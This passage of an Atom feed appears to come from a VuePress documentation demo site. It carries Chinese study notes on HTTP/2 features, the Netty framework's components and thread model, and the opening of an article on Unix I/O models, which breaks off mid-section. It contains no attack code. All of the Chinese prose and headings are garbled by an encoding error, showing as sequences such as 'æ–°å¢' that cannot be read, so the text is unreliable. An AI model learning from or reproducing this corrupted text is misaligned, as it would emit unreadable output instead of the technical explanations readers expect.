<li>æ–°å¢çŠ¶æ€ç  100</li>
<li>æ”¯æŒåˆ†å—ä¼ è¾“ç¼–ç </li>
<li>æ–°å¢ç¼“å­˜å¤„ç†æŒ‡ä»¤ max-age</li>
</ul>
<h1 id="ä¸ƒã€http-2-0" tabindex="-1"> ä¸ƒã€HTTP/2.0</h1>
<h2 id="http-1-x-ç¼ºé™·" tabindex="-1"> HTTP/1.x ç¼ºé™·</h2>
<p>HTTP/1.x å®ç°ç®€å•æ˜¯ä»¥ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·çš„ï¼š</p>
<ul>
<li>å®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨å¤šä¸ªè¿æ¥æ‰èƒ½å®ç°å¹¶å‘å’Œç¼©çŸ­å»¶è¿Ÿï¼›</li>
<li>ä¸ä¼šå‹ç¼©è¯·æ±‚å’Œå“åº”é¦–éƒ¨ï¼Œä»è€Œå¯¼è‡´ä¸å¿…è¦çš„ç½‘ç»œæµé‡ï¼›</li>
<li>ä¸æ”¯æŒæœ‰æ•ˆçš„èµ„æºä¼˜å…ˆçº§ï¼Œè‡´ä½¿åº•å±‚ TCP è¿æ¥çš„åˆ©ç”¨ç‡ä½ä¸‹ã€‚</li>
</ul>
<h2 id="äºŒè¿›åˆ¶åˆ†å¸§å±‚" tabindex="-1"> äºŒè¿›åˆ¶åˆ†å¸§å±‚</h2>
<p>HTTP/2.0 å°†æŠ¥æ–‡åˆ†æˆ HEADERS å¸§å’Œ DATA å¸§ï¼Œå®ƒä»¬éƒ½æ˜¯äºŒè¿›åˆ¶æ ¼å¼çš„ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400"/> </div><br>
<p>åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œåªä¼šæœ‰ä¸€ä¸ª TCP è¿æ¥å­˜åœ¨ï¼Œå®ƒæ‰¿è½½äº†ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµï¼ˆStreamï¼‰ã€‚</p>
<ul>
<li>ä¸€ä¸ªæ•°æ®æµï¼ˆStreamï¼‰éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å’Œå¯é€‰çš„ä¼˜å…ˆçº§ä¿¡æ¯ï¼Œç”¨äºæ‰¿è½½åŒå‘ä¿¡æ¯ã€‚</li>
<li>æ¶ˆæ¯ï¼ˆMessageï¼‰æ˜¯ä¸é€»è¾‘è¯·æ±‚æˆ–å“åº”å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—å¸§ã€‚</li>
<li>å¸§ï¼ˆFrameï¼‰æ˜¯æœ€å°çš„é€šä¿¡å•ä½ï¼Œæ¥è‡ªä¸åŒæ•°æ®æµçš„å¸§å¯ä»¥äº¤é”™å‘é€ï¼Œç„¶åå†æ ¹æ®æ¯ä¸ªå¸§å¤´çš„æ•°æ®æµæ ‡è¯†ç¬¦é‡æ–°ç»„è£…ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af198da1-2480-4043-b07f-a3b91a88b815.png" width="600"/> </div><br>
<h2 id="æœåŠ¡ç«¯æ¨é€" tabindex="-1"> æœåŠ¡ç«¯æ¨é€</h2>
<p>HTTP/2.0 åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šæŠŠç›¸å…³çš„èµ„æºä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸éœ€è¦å†æ¬¡å‘èµ·è¯·æ±‚äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯è¯·æ±‚ page.html é¡µé¢ï¼ŒæœåŠ¡ç«¯å°±æŠŠ script.js å’Œ style.css ç­‰ä¸ä¹‹ç›¸å…³çš„èµ„æºä¸€èµ·å‘ç»™å®¢æˆ·ç«¯ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800"/> </div><br>
<h2 id="é¦–éƒ¨å‹ç¼©" tabindex="-1"> é¦–éƒ¨å‹ç¼©</h2>
<p>HTTP/1.1 çš„é¦–éƒ¨å¸¦æœ‰å¤§é‡ä¿¡æ¯ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦é‡å¤å‘é€ã€‚</p>
<p>HTTP/2.0 è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶ç»´æŠ¤å’Œæ›´æ–°ä¸€ä¸ªåŒ…å«ä¹‹å‰è§è¿‡çš„é¦–éƒ¨å­—æ®µè¡¨ï¼Œä»è€Œé¿å…äº†é‡å¤ä¼ è¾“ã€‚</p>
<p>ä¸ä»…å¦‚æ­¤ï¼ŒHTTP/2.0 ä¹Ÿä½¿ç”¨ Huffman ç¼–ç å¯¹é¦–éƒ¨å­—æ®µè¿›è¡Œå‹ç¼©ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/_u4E0B_u8F7D.png" width="600"/> </div><br>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>ä¸Šé‡å®£. å›¾è§£ HTTP[M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2014.</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP" target="_blank" rel="noopener noreferrer">MDN : HTTP</a></li>
<li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener noreferrer">HTTP/2 ç®€ä»‹</a></li>
<li><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener noreferrer">htmlspecialchars</a></li>
<li><a href="http://java2db.com/java-io/how-to-get-and-the-difference-between-file-uri-and-url-in-java" target="_blank" rel="noopener noreferrer">Difference between file URI and URL in java</a></li>
<li><a href="https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement" target="_blank" rel="noopener noreferrer">How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement</a></li>
<li><a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html" target="_blank" rel="noopener noreferrer">æµ…è°ˆ HTTP ä¸­ Get ä¸ Post çš„åŒºåˆ«</a></li>
<li><a href="https://www.webdancers.com/are-http-and-www-necesary/" target="_blank" rel="noopener noreferrer">Are http:// and www really necessary?</a></li>
<li><a href="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html" target="_blank" rel="noopener noreferrer">HTTP (HyperText Transfer Protocol)</a></li>
<li><a href="https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/" target="_blank" rel="noopener noreferrer">Web-VPN: Secure Proxies with SPDY &amp; Chrome</a></li>
<li><a href="http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg" target="_blank" rel="noopener noreferrer">File:HTTP persistent connection.svg</a></li>
<li><a href="https://en.wikipedia.org/wiki/Proxy_server" target="_blank" rel="noopener noreferrer">Proxy server</a></li>
<li><a href="https://www.x-cart.com/blog/what-is-https-and-ssl.html" target="_blank" rel="noopener noreferrer">What Is This HTTPS/SSL Thing And Why Should You Care?</a></li>
<li><a href="https://securebox.comodo.com/ssl-sniffing/ssl-offloading/" target="_blank" rel="noopener noreferrer">What is SSL Offloading?</a></li>
<li><a href="https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html" target="_blank" rel="noopener noreferrer">Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption</a></li>
<li><a href="https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication" target="_blank" rel="noopener noreferrer">An Introduction to Mutual SSL Authentication</a></li>
<li><a href="https://danielmiessler.com/study/url-uri/" target="_blank" rel="noopener noreferrer">The Difference Between URLs and URIs</a></li>
<li><a href="https://juejin.im/entry/5766c29d6be3ff006a31b84e#comment" target="_blank" rel="noopener noreferrer">Cookie ä¸ Session çš„åŒºåˆ«</a></li>
<li><a href="https://www.zhihu.com/question/19786827" target="_blank" rel="noopener noreferrer">COOKIE å’Œ SESSION æœ‰ä»€ä¹ˆåŒºåˆ«</a></li>
<li><a href="https://harttle.land/2015/08/10/cookie-session.html" target="_blank" rel="noopener noreferrer">Cookie/Session çš„æœºåˆ¶ä¸å®‰å…¨</a></li>
<li><a href="https://shijianan.com/2017/06/11/https/" target="_blank" rel="noopener noreferrer">HTTPS è¯ä¹¦åŸç†</a></li>
<li><a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" target="_blank" rel="noopener noreferrer">What is the difference between a URI, a URL and a URN?</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener noreferrer">XMLHttpRequest</a></li>
<li><a href="https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/" target="_blank" rel="noopener noreferrer">XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?</a></li>
<li><a href="https://www.ssl2buy.com/wiki/symmetric-vs-asymmetric-encryption-what-are-differences" target="_blank" rel="noopener noreferrer">Symmetric vs. Asymmetric Encryption â€“ What are differences?</a></li>
<li><a href="https://www.kancloud.cn/digest/web-performance-http2" target="_blank" rel="noopener noreferrer">Web æ€§èƒ½ä¼˜åŒ–ä¸ HTTP/2</a></li>
<li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener noreferrer">HTTP/2 ç®€ä»‹</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Netty.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Netty.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="ä»‹ç»" tabindex="-1"> ä»‹ç»</h1>
<p>Netty æ˜¯ä¸€ä¸ªåˆ©ç”¨ Java çš„é«˜çº§ç½‘ç»œçš„èƒ½åŠ›ï¼Œéšè—å…¶èƒŒåçš„å¤æ‚æ€§è€Œæä¾›ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„ API çš„å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¡†æ¶ã€‚</p>
<p>Nettyæ˜¯ä¸€ä¸ªå¼‚æ­¥ã€åŸºäºäº‹ä»¶é©±åŠ¨çš„ç½‘ç»œåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œå…¶å¯¹ Java NIOè¿›è¡Œäº†å°è£…ï¼Œå¤§å¤§ç®€åŒ–äº† TCP æˆ–è€… UDP æœåŠ¡å™¨çš„ç½‘ç»œç¼–ç¨‹ã€‚</p>
<h2 id="nettyä¼˜åŠ¿" tabindex="-1"> Nettyä¼˜åŠ¿</h2>
<ul>
<li>å¹¶å‘é«˜</li>
<li>ä¼ è¾“å¿«</li>
<li>å°è£…å¥½</li>
</ul>
<h2 id="æ ¸å¿ƒç»„ä»¶" tabindex="-1"> æ ¸å¿ƒç»„ä»¶</h2>
<ul>
<li>Bootstrapå’ŒServerBootstrapï¼šNettyåº”ç”¨ç¨‹åºé€šè¿‡è®¾ç½®bootstrapå¼•å¯¼ç±»æ¥å®Œæˆï¼Œè¯¥ç±»æä¾›äº†ä¸€ä¸ªç”¨äºåº”ç”¨ç¨‹åºç½‘ç»œå±‚é…ç½®çš„å®¹å™¨ã€‚BootstrapæœåŠ¡ç«¯çš„æ˜¯ServerBootstrapï¼Œå®¢æˆ·ç«¯çš„æ˜¯Bootstrapã€‚</li>
<li>Channelï¼šNetty ä¸­çš„æ¥å£ Channel å®šä¹‰äº†ä¸ socket ä¸°å¯Œäº¤äº’çš„æ“ä½œé›†ï¼šbind, close, config, connect, isActive, isOpen, isWritable, read, write ç­‰ç­‰ã€‚</li>
<li>ChannelHandlerï¼šChannelHandler æ”¯æŒå¾ˆå¤šåè®®ï¼Œå¹¶ä¸”æä¾›ç”¨äºæ•°æ®å¤„ç†çš„å®¹å™¨ï¼ŒChannelHandlerç”±ç‰¹å®šäº‹ä»¶è§¦å‘ï¼Œ å¸¸ç”¨çš„ä¸€ä¸ªæ¥å£æ˜¯ChannelInboundHandlerï¼Œè¯¥ç±»å‹å¤„ç†å…¥ç«™è¯»æ•°æ®ï¼ˆsocketè¯»äº‹ä»¶ï¼‰ã€‚</li>
<li>ChannelPipelineï¼šChannelPipeline æä¾›äº†ä¸€ä¸ªå®¹å™¨ç»™ ChannelHandler é“¾å¹¶æä¾›äº†ä¸€ä¸ªAPI ç”¨äºç®¡ç†æ²¿ç€é“¾å…¥ç«™å’Œå‡ºç«™äº‹ä»¶çš„æµåŠ¨ã€‚æ¯ä¸ª Channel éƒ½æœ‰è‡ªå·±çš„ChannelPipelineï¼Œå½“ Channel åˆ›å»ºæ—¶è‡ªåŠ¨åˆ›å»ºçš„</li>
<li>EventLoopï¼šEventLoop ç”¨äºå¤„ç† Channel çš„ I/O æ“ä½œã€‚ä¸€ä¸ªå•ä¸€çš„ EventLoopé€šå¸¸ä¼šå¤„ç†å¤šä¸ª Channel äº‹ä»¶ã€‚ä¸€ä¸ª EventLoopGroup å¯ä»¥å«æœ‰å¤šäºä¸€ä¸ªçš„ EventLoop å’Œ æä¾›äº†ä¸€ç§è¿­ä»£ç”¨äºæ£€ç´¢æ¸…å•ä¸­çš„ä¸‹ä¸€ä¸ªã€‚</li>
<li>ChannelFutureï¼šNetty æ‰€æœ‰çš„ I/O æ“ä½œéƒ½æ˜¯å¼‚æ­¥ã€‚å› ä¸ºä¸€ä¸ªæ“ä½œå¯èƒ½æ— æ³•ç«‹å³è¿”å›ï¼Œæˆ‘ä»¬éœ€è¦æœ‰ä¸€ç§æ–¹æ³•åœ¨ä»¥åè·å–å®ƒçš„ç»“æœã€‚å‡ºäºè¿™ä¸ªç›®çš„ï¼ŒNetty æä¾›äº†æ¥å£ ChannelFuture,å®ƒçš„ addListener æ–¹æ³•</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-14-10-17-29.png" alt="" loading="lazy"></p>
<p>Netty æ˜¯ä¸€ä¸ªéé˜»å¡ã€äº‹ä»¶é©±åŠ¨çš„ç½‘ç»œæ¡†æ¶ã€‚Netty å®é™…ä¸Šæ˜¯ä½¿ç”¨ Threadsï¼ˆ å¤šçº¿ç¨‹ï¼‰ å¤„ç† I/Oäº‹ä»¶çš„ï¼Œå¯¹äºç†Ÿæ‚‰å¤šçº¿ç¨‹ç¼–ç¨‹çš„è¯»è€…å¯èƒ½ä¼šéœ€è¦å…³æ³¨åŒæ­¥ä»£ç ã€‚è¿™æ ·çš„æ–¹å¼ä¸å¥½ï¼Œå› ä¸ºåŒæ­¥ä¼šå½±å“ç¨‹åºçš„æ€§èƒ½ï¼ŒNetty çš„è®¾è®¡ä¿è¯ç¨‹åºå¤„ç†äº‹ä»¶ä¸ä¼šæœ‰åŒæ­¥ã€‚å› ä¸ºæŸä¸ªChanneläº‹ä»¶æ˜¯è¢«æ·»åŠ åˆ°ä¸€ä¸ªEventLoopä¸­çš„ï¼Œä»¥åè¯¥Channeläº‹ä»¶éƒ½æ˜¯ç”±è¯¥EventLoopæ¥å¤„ç†çš„ï¼Œè€ŒEventLoopæ˜¯ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†çš„ï¼Œä¹Ÿå°±æ˜¯è¯´Nettyä¸éœ€è¦åŒæ­¥IOæ“ä½œï¼ŒEventLoopä¸EventLoopGroupçš„å…³ç³»å¯ä»¥ç†è§£ä¸ºçº¿ç¨‹ä¸çº¿ç¨‹æ± çš„å…³ç³»ä¸€æ ·ã€‚</p>
<h2 id="çº¿ç¨‹æ¨¡å‹" tabindex="-1"> çº¿ç¨‹æ¨¡å‹</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-14-09-40-25.png" alt="" loading="lazy"></p>
<p>ä¸Šå›¾ä¸‹ä¾§ä¸ºNetty Serverç«¯,å½“NettyServerå¯åŠ¨æ—¶å€™ä¼šåˆ›å»ºä¸¤ä¸ªNioEventLoopGroupçº¿ç¨‹æ± ç»„ï¼Œå…¶ä¸­bossç»„ç”¨æ¥æ¥å—å®¢æˆ·ç«¯å‘æ¥çš„è¿æ¥ï¼Œworkerç»„åˆ™è´Ÿè´£å¯¹å®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹çš„è¿æ¥è¿›è¡Œå¤„ç†ï¼›å¦‚ä¸Šå›¾æ¯ä¸ªNioEventLoopGroupé‡Œé¢åŒ…å«äº†å¤šä¸ªNioEventLoopï¼Œæ¯ä¸ªNioEventLoopä¸­åŒ…å«äº†ä¸€ä¸ªNIO Selectorã€ä¸€ä¸ªé˜Ÿåˆ—ã€ä¸€ä¸ªçº¿ç¨‹ï¼›å…¶ä¸­çº¿ç¨‹ç”¨æ¥åšè½®è¯¢æ³¨å†Œåˆ°Selectorä¸Šçš„Channelçš„è¯»å†™äº‹ä»¶å’Œå¯¹æŠ•é€’åˆ°é˜Ÿåˆ—é‡Œé¢çš„äº‹ä»¶è¿›è¡Œå¤„ç†ã€‚</p>
<p>å½“NettyServerå¯åŠ¨æ—¶å€™ä¼šæ³¨å†Œç›‘å¬å¥—æ¥å­—é€šé“NioServerSocketChannelåˆ°bossçº¿ç¨‹æ± ç»„ä¸­çš„æŸä¸€ä¸ªNioEventLoopç®¡ç†çš„Selectorä¸Šï¼Œç„¶åå…¶å¯¹åº”çš„çº¿ç¨‹åˆ™ä¼šè´Ÿè´£è½®è¯¢è¯¥ç›‘å¬å¥—æ¥å­—ä¸Šçš„è¿æ¥è¯·æ±‚ï¼›å½“å®¢æˆ·ç«¯å‘æ¥ä¸€ä¸ªè¿æ¥è¯·æ±‚æ—¶å€™ï¼Œbossçº¿ç¨‹æ± ç»„ä¸­æ³¨å†Œäº†ç›‘å¬å¥—æ¥å­—çš„NioEventLoopä¸­çš„Selectorä¼šè¯»å–è¯»å–å®Œæˆäº†TCPä¸‰æ¬¡æ¡æ‰‹çš„è¯·æ±‚ï¼Œç„¶ååˆ›å»ºå¯¹åº”çš„è¿æ¥å¥—æ¥å­—é€šé“NioSocketChannelï¼Œç„¶åæŠŠå…¶æ³¨å†Œåˆ°workerçº¿ç¨‹æ± ç»„ä¸­çš„æŸä¸€ä¸ªNioEventLoopä¸­ç®¡ç†çš„ä¸€ä¸ªNIO Selectorä¸Šï¼Œç„¶åè¯¥è¿æ¥å¥—æ¥å­—é€šé“NioSocketChannelä¸Šçš„æ‰€æœ‰è¯»å†™äº‹ä»¶éƒ½ç”±è¯¥NioEventLoopç®¡ç†ã€‚å½“å®¢æˆ·ç«¯å‘æ¥å¤šä¸ªè¿æ¥æ—¶å€™ï¼ŒNettyServerç«¯åˆ™ä¼šåˆ›å»ºå¤šä¸ªNioSocketChannelï¼Œè€Œworkerçº¿ç¨‹æ± ç»„ä¸­çš„NioEventLoopæ˜¯æœ‰ä¸ªæ•°é™åˆ¶çš„ï¼Œæ‰€ä»¥Nettyæœ‰ä¸€å®šçš„ç­–ç•¥æŠŠå¾ˆå¤šNioSocketChannelæ³¨å†Œåˆ°ä¸åŒçš„NioEventLoopä¸Šï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªNioEventLoopä¸­ä¼šç®¡ç†å¥½å¤šå®¢æˆ·ç«¯å‘æ¥çš„è¿æ¥ï¼Œç„¶åé€šè¿‡å¾ªç¯è½®è¯¢å¤„ç†æ¯ä¸ªè¿æ¥çš„è¯»å†™äº‹ä»¶ã€‚</p>
<p>å¦‚ä¸Šå›¾ä¸Šä¾§éƒ¨åˆ†ä¸ºNetty Clientéƒ¨åˆ†ï¼Œå½“NettyClientå¯åŠ¨æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªNioEventLoopGroupï¼Œç”¨æ¥å‘èµ·è¯·æ±‚å¹¶å¯¹å»ºç«‹TCPä¸‰æ¬¡è¿æ¥çš„å¥—æ¥å­—çš„è¯»å†™äº‹ä»¶è¿›è¡Œå¤„ç†ã€‚å½“è°ƒç”¨Bootstrapçš„connectæ–¹æ³•å‘èµ·è¿æ¥è¯·æ±‚åå†…éƒ¨ä¼šåˆ›å»ºä¸€ä¸ªNioSocketChannelç”¨æ¥ä»£è¡¨è¯¥è¯·æ±‚ï¼Œå¹¶ä¸”ä¼šæŠŠè¯¥NioSocketChannelæ³¨å†Œåˆ°NioSocketChannelç®¡ç†çš„æŸä¸ªNioEventLoopçš„Selectorä¸Šï¼Œç„¶åè¯¥NioEventLoopçš„è¯»å†™äº‹ä»¶éƒ½æœ‰è¯¥NioEventLoopè´Ÿè´£å¤„ç†ã€‚</p>
<p>Nettyä¹‹æ‰€ä»¥è¯´æ˜¯å¼‚æ­¥éé˜»å¡ç½‘ç»œæ¡†æ¶æ˜¯å› ä¸ºé€šè¿‡NioSocketChannelçš„writeç³»åˆ—æ–¹æ³•å‘è¿æ¥é‡Œé¢å†™å…¥æ•°æ®æ—¶å€™æ˜¯éé˜»å¡çš„ï¼Œé©¬ä¸Šä¼šè¿”å›çš„ï¼Œå³ä½¿è°ƒç”¨å†™å…¥çš„çº¿ç¨‹æ˜¯æˆ‘ä»¬çš„ä¸šåŠ¡çº¿ç¨‹ï¼Œè¿™æ˜¯Nettyé€šè¿‡åœ¨ChannelPipelineä¸­åˆ¤æ–­è°ƒç”¨NioSocketChannelçš„writeçš„è°ƒç”¨çº¿ç¨‹æ˜¯ä¸æ˜¯å…¶å¯¹åº”çš„NioEventLoopä¸­çš„çº¿ç¨‹æ¥å®ç°çš„ï¼Œå¦‚æœå‘ç°ä¸æ˜¯åˆ™ä¼šæŠŠå†™å…¥è¯·æ±‚å°è£…ä¸ºWriteTaskæŠ•é€’åˆ°å…¶å¯¹åº”çš„NioEventLoopä¸­çš„é˜Ÿåˆ—é‡Œé¢ï¼Œç„¶åç­‰å…¶å¯¹åº”çš„NioEventLoopä¸­çš„çº¿ç¨‹è½®è¯¢è¿æ¥å¥—æ¥å­—çš„è¯»å†™äº‹ä»¶æ—¶å€™æå¸¦ä»é˜Ÿåˆ—é‡Œé¢å–å‡ºæ¥æ‰§è¡Œï¼›æ€»ç»“è¯´å°±æ˜¯æ¯ä¸ªNioSocketChannelå¯¹åº”çš„è¯»å†™äº‹ä»¶éƒ½æ˜¯åœ¨å…¶å¯¹åº”çš„NioEventLoopç®¡ç†çš„å•çº¿ç¨‹å†…æ‰§è¡Œï¼Œå¯¹åŒä¸€ä¸ªNioSocketChannelä¸å­˜åœ¨å¹¶å‘è¯»å†™ï¼Œæ‰€ä»¥æ— éœ€åŠ é”å¤„ç†ã€‚</p>
<p>å¦å¤–å½“ä»NioSocketChannelä¸­è¯»å–æ•°æ®æ—¶å€™ï¼Œå¹¶ä¸æ˜¯ä½¿ç”¨ä¸šåŠ¡çº¿ç¨‹æ¥é˜»å¡ç­‰å¾…ï¼Œè€Œæ˜¯ç­‰NioEventLoopä¸­çš„IOè½®è¯¢çº¿ç¨‹å‘ç°Selectorä¸Šæœ‰æ•°æ®å°±ç»ªæ—¶å€™ï¼Œé€šè¿‡äº‹ä»¶é€šçŸ¥æ–¹å¼æ¥é€šçŸ¥æˆ‘ä»¬ä¸šåŠ¡æ•°æ®å·²ç»å°±ç»ªï¼Œå¯ä»¥æ¥è¯»å–å¹¶å¤„ç†äº†ã€‚</p>
<p>æ€»ç»“ä¸€å¥è¯å°±æ˜¯ä½¿ç”¨Nettyæ¡†æ¶è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶å€™ï¼Œå½“æˆ‘ä»¬å‘èµ·è¯·æ±‚åè¯·æ±‚ä¼šé©¬ä¸Šè¿”å›ï¼Œè€Œä¸ä¼šé˜»å¡æˆ‘ä»¬çš„ä¸šåŠ¡è°ƒç”¨çº¿ç¨‹ï¼›å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–è¯·æ±‚çš„å“åº”ç»“æœï¼Œä¹Ÿä¸éœ€è¦ä¸šåŠ¡è°ƒç”¨çº¿ç¨‹ä½¿ç”¨é˜»å¡çš„æ–¹å¼æ¥ç­‰å¾…ï¼Œè€Œæ˜¯å½“å“åº”ç»“æœå‡ºæ¥æ—¶å€™ä½¿ç”¨IOçº¿ç¨‹å¼‚æ­¥é€šçŸ¥ä¸šåŠ¡çš„æ–¹å¼ï¼Œå¯çŸ¥åœ¨æ•´ä¸ªè¯·æ±‚-å“åº”è¿‡ç¨‹ä¸­ä¸šåŠ¡çº¿ç¨‹ä¸ä¼šç”±äºé˜»å¡ç­‰å¾…è€Œä¸èƒ½å¹²å…¶ä»–äº‹æƒ…ã€‚</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ç½‘ç»œ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€I/O æ¨¡å‹</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Socket.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/Socket.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€i-o-æ¨¡å‹" tabindex="-1"> ä¸€ã€I/O æ¨¡å‹</h1>
<p>ä¸€ä¸ªè¾“å…¥æ“ä½œé€šå¸¸åŒ…æ‹¬ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>ç­‰å¾…æ•°æ®å‡†å¤‡å¥½</li>
<li>ä»å†…æ ¸å‘è¿›ç¨‹å¤åˆ¶æ•°æ®</li>
</ul>
<p>å¯¹äºä¸€ä¸ªå¥—æ¥å­—ä¸Šçš„è¾“å…¥æ“ä½œï¼Œç¬¬ä¸€æ­¥é€šå¸¸æ¶‰åŠç­‰å¾…æ•°æ®ä»ç½‘ç»œä¸­åˆ°è¾¾ã€‚å½“æ‰€ç­‰å¾…æ•°æ®åˆ°è¾¾æ—¶ï¼Œå®ƒè¢«å¤åˆ¶åˆ°å†…æ ¸ä¸­çš„æŸä¸ªç¼“å†²åŒºã€‚ç¬¬äºŒæ­¥å°±æ˜¯æŠŠæ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºã€‚</p>
<p>Unix æœ‰äº”ç§ I/O æ¨¡å‹ï¼š</p>
<ul>
<li>é˜»å¡å¼ I/O</li>
<li>éé˜»å¡å¼ I/O</li>
<li>I/O å¤ç”¨ï¼ˆselect å’Œ pollï¼‰</li>
<li>ä¿¡å·é©±åŠ¨å¼ I/Oï¼ˆSIGIOï¼‰</li>
<li>å¼‚æ­¥ I/Oï¼ˆAIOï¼‰</li>
</ul>
<h2 id="é˜»å¡å¼-i-o" tabindex="-1"> é˜»å¡å¼ I/O</h2>
<p>åº”ç”¨è¿›ç¨‹è¢«é˜»å¡ï¼Œç›´åˆ°æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºä¸­æ‰è¿”å›ã€‚</p>
<p>åº”è¯¥æ³¨æ„åˆ°ï¼Œåœ¨é˜»å¡çš„è¿‡ç¨‹ä¸­ï¼Œå…¶å®ƒåº”ç”¨è¿›ç¨‹è¿˜å¯ä»¥æ‰§è¡Œï¼Œå› æ­¤é˜»å¡ä¸æ„å‘³ç€æ•´ä¸ªæ“ä½œç³»ç»Ÿéƒ½è¢«é˜»å¡ã€‚å› ä¸ºå…¶å®ƒåº”ç”¨è¿›ç¨‹è¿˜å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥ä¸æ¶ˆè€— CPU æ—¶é—´ï¼Œè¿™ç§æ¨¡å‹çš„ CPU åˆ©ç”¨ç‡ä¼šæ¯”è¾ƒé«˜ã€‚</p>
<p>ä¸‹å›¾ä¸­ï¼Œrecvfrom() ç”¨äºæ¥æ”¶ Socket ä¼ æ¥çš„æ•°æ®ï¼Œå¹¶å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹çš„ç¼“å†²åŒº buf ä¸­ã€‚è¿™é‡ŒæŠŠ recvfrom() å½“æˆç³»ç»Ÿè°ƒç”¨ã€‚</p>
